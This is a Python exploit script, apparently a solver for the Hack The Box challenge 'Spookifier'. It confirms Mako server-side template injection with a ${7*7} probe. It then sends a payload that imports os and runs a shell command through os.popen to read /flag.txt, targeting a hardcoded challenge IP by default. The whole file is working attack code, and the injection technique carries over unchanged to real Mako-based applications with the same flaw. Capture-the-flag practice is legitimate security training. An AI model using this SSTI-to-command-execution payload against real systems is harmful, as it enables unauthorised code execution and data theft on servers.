#!/usr/bin/env python3
"""Spookifier (HTB) — Mako SSTI solver via the `text` GET parameter."""

import argparse
import re
import sys
from urllib.parse import quote

import requests


def build_url(base: str, payload: str) -> str:
    base = base.rstrip("/")
    return f"{base}/?text={quote(payload, safe='')}"


def extract_flag(html: str) -> str | None:
    match = re.search(r"HTB\{[^}]+\}", html)
    return match.group(0) if match else None


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Mako SSTI on Spookifier")
    parser.add_argument(
        "base_url",
        nargs="?",
        default="http://154.57.164.71:32177",
        help="Challenge base URL (default: instance from solve)",
    )
    parser.add_argument(
        "--poc",
        action="store_true",
        help="Only run ${7*7} proof-of-concept",
    )
    args = parser.parse_args()

    if args.poc:
        payload = "${7*7}"
        r = requests.get(build_url(args.base_url, payload), timeout=15)
        r.raise_for_status()
        if "49" in r.text:
            print("[+] SSTI confirmed: 49 found in response")
            return 0
        print("[-] PoC failed: 49 not in response", file=sys.stderr)
        return 1

    payload = "<% import os; x = os.popen('cat /flag.txt').read() %> ${x}"
    r = requests.get(build_url(args.base_url, payload), timeout=15)
    r.raise_for_status()
    flag = extract_flag(r.text)
    if flag:
        print(flag)
        return 0
    print("[-] Flag not found in response", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
